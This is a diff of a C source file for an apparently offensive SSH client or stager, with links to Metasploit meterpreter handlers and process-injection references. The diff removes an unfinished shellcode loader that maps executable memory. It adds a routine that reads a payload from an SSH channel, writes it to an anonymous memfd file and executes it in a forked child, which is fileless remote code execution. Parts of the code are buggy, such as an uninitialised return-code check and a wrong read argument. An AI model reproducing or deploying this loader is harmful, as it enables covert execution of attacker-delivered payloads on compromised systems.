@@ -61,86 +61,83 @@ int exec_module(ssh_session session){
 }
 #include <winsock.h>
 #else
-#include <unistd.h>
+#define _GNU_SOURCE
 #include <sys/mman.h>
-int exec_module(ssh_session session){
-	unsigned long payload_size;
-    char * alloc_mem_ptr;
-    int i;
-    void (*func_ptr)();
+#include <fcntl.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/wait.h>
 
+int do_exec(char *buff, int size){
+    pid_t child;
 
-/* TODO LINKS:
- * https://www.codeproject.com/articles/33340/code-injection-into-running-linux-application
- * https://forums.pcsx2.net/Thread-blog-VirtualAlloc-on-Linux
- * https://rapid7.github.io/metasploit-framework/api/Msf/Exploit.html#handler_bind%3F-instance_method
- * https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote.html
- * https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/handler.rb
- * https://github.com/rapid7/metasploit-framework/search?utf8=%E2%9C%93&q=MSF%3A%3AExploit%3A%3ARemote&type=
- * https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit.rb
- * https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/
- * https://attack.mitre.org/techniques/T1055/
- * https://www.rapid7.com/db/modules/payload/linux/armle/meterpreter/reverse_tcp
- * https://github.com/rapid7/metasploit-framework/blob/master/msfvenom
- * https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/python/meterpreter/reverse_tcp.md
- */
-
-
-
-
-
-
-
-        
-    //int sock_count = recv(remote_sock, (char *)&char_buf_ptr, 4, 0);
+// Create anon FD
+    int fd;
+    fd = memfd_create("", MFD_CLOEXEC);
+    write(fd, buff, size);
+    char *p;
+    asprintf(&p, "/proc/self/fd/%i", fd);
     
-    //if (sock_count != 4 || char_buf_ptr <= 0) 
-    //    cleanup_sockets(remote_sock);
-    
-    //alloc_mem_ptr = VirtualAlloc(0, char_buf_ptr + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	// to RESERVE memory in Linux, use mmap with a private, anonymous, non-accessible mapping.
-	// The following line reserves 1gb of ram starting at 0x10000000.
+// fork to background
+    child = fork();
+    if (child == 0)
+    {
+        execlp(p, "example", NULL);
+        perror("execution error");
+        exit(EXIT_FAILURE);
+    }
+    else if (child == -1)
+    {
+        perror("fork");
+        exit(EXIT_FAILURE);
+    }
 
-	void* mem_ptr = mmap(0, payload_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+// Wait and exit
+    waitpid(child, NULL, 0);
+    return 0;
+}
 
-	// to COMMIT memory in Linux, use mprotect on the range of memory you'd like to commit, and
-	// grant the memory READ and/or WRITE access.
-	// The following line commits 1mb of the buffer.  It will return -1 on out of memory errors.
+int exec_module(ssh_channel channel){
+	int rc = 0;
+	int nbytes = 0;
+	int size = 0;
+	
+	printf("[ ] Sent request for shell\n");
+  	if (rc != SSH_OK)
+  	{
+    	ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return rc;
+  	}
+	printf("[+] Made it through check\n");
 
-	int result3 = mprotect(mem_ptr, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC);
-	if (result3 < 0)
-	{
-		perror("Failed to commit memory");
-		return -1;
+	nbytes = ssh_channel_read(channel, size, sizeof(size), 0);
+	printf("read %d bytes from channel\n", nbytes);
+	if (nbytes < 0){
+		printf("Caught read error from server...\n");
+    	ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return SSH_ERROR;
 	}
+	printf("Wrote to channel\n");
+
+		
 	
+	rc = ssh_channel_write(channel, "0", 1);
+	if (rc == SSH_ERROR){
+		printf("caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return rc;
+	}
 
+	char *buff = malloc(size);
 
-    if (alloc_mem_ptr == NULL)
-		return -1;
-        
-    alloc_mem_ptr[0] = 0xBF;
-    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
-    //memcpy(alloc_mem_ptr + 1, &remote_sock, 4);
+	rc = ssh_channel_read(channel, buff, size, 0);
 
-	int rc=0;
-    int count=0;
-    void * startb = alloc_mem_ptr + 5;
-    while (count < payload_size) {
-        //rc = recv(sock, (char *)startb, size_of - count, 0);
-        startb += rc; 
-        count += rc;
-        if (rc == -1) 
-            return -1;
-    } 
-        
-    //sock_count = get_payload(remote_sock, alloc_mem_ptr + 5, char_buf_ptr);
-
-    func_ptr = (void (*)())alloc_mem_ptr;
-    func_ptr();
-
-	
-
+	do_exec(buff, size);
 }
 #endif
 
@@ -419,12 +416,13 @@ ssh_session connect_ssh(const char *host, const char *user,int verbosity){
 }
 
 
-int show_remote_processes(ssh_session session)
+int func_loop(ssh_session session)
 {
   	ssh_channel channel;
   	int rc;
-  	char buffer[256] = "This is a test!\n";
+  	char buffer[256];
   	int nbytes;
+	int quitting = 0;
   	channel = ssh_channel_new(session);
 
 	printf("[+] Created new SSH channel\n");
@@ -451,7 +449,7 @@ int show_remote_processes(ssh_session session)
 	char inBuff[256];
 	memset(inBuff, 0, sizeof(inBuff));
 
-	while (1)
+	while (!quitting)
 	{
 		memset(inBuff, 0, sizeof(inBuff));
 		memset(buffer, 0, sizeof(buffer));
@@ -560,7 +558,7 @@ int main(int argc, char* argv[]){
 		return 1;
 	}
 
-	show_remote_processes(session);
+	func_loop(session);
 
 	// Check out this function:
 	// ssh_channel_write()
